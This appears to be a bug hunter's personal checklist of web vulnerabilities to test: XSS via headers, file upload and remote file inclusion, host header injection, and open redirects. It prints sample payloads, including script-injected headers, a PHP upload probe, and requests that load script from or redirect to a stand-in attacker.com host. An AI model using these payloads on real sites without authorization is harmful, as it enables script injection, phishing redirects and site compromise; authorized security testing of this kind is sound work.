Bug Hunting Checklist
----------------------------------
These are the vulnerabilities/exploits I have to check when I'm bug hunting. 
Note: This is not a final list. This note will gradually grow with more detailed information and instructions

1. XSS
2. Host Header Injection
3. URL Redirection
4. Parameter Tampering 

# 1. XSS

### 3 Types of XSS

1. Reflected XSS – This attack occurs, when a malicious script is not being saved on the web server but reflected in the website’s results.
2. Stored XSS – This attack occurs when a malicious script is being saved on the web server permanently.
3. DOM – This occurs, when the DOM environment is being changed, but the code remains the same.

Note:
* Use Burp Suite Spider to find all parameters on target site.
* Use a XSS Payload list with Burp Suite Intruder to speed up injections.

----------------------------------

# XSS Through Host Header Parameters

Example 1:
Host: victim.com"</b><script>alert('1');</script>

Example 2:
Referer: <script>alert('1');</script>

Note: If only the headers are reflected on the page it might be vulnerable to XSS injections.

----------------------------------

# XSS Through File Upload

Note: 
* When uploading an image use Burp Suite Proxy Intercepter to capture the Post Data Form.
Then use XSS Payload list to check for vulnerabilities. 
* If site is using php you can upload a php3 script with the following code to see if it's 
vulnerable to Unrestricted File Upload.

```
<?php
  echo $_GET["c"];
?>
```
* When code is uploaded go to the file upload path and type in the url bar
the parameter 'c' along with phpinfo() to see if exploit was successful.

----------------------------------

# XSS Through Remote File Inclusion

Example:

Before: http://victim.com/ajax.php?url=http://victim.com/foo.rss

After: http://victim.com/ajax.php?url=http://attacker.com/alert.js

Note: 
This will run the exploit when user presses return

----------------------------------

# 2. Host Header Injection

Example 1:
Host: victim.com
to
Host: attacker.com

Example 2:
Host: victim.com
X-Forwarded-Host: attacker.com

Example 3:
Host: attacker.com
X-Forwarded-Host: victim.com

Note:
* Location header should show injected site.
* Some links in the page may direct to injected site so check links in page.

----------------------------------

# 3. URL Redirection Through Path Fragments

Example 1:
Before - https://victim.com
After - https://victim.com//attacker.com/

Note:
* This will redirect users to newly injected site.
* Use Burp Suite Spider to find all parameters on target site.
* Use a XSS Payload list with Burp Suite Intruder to speed up injections.
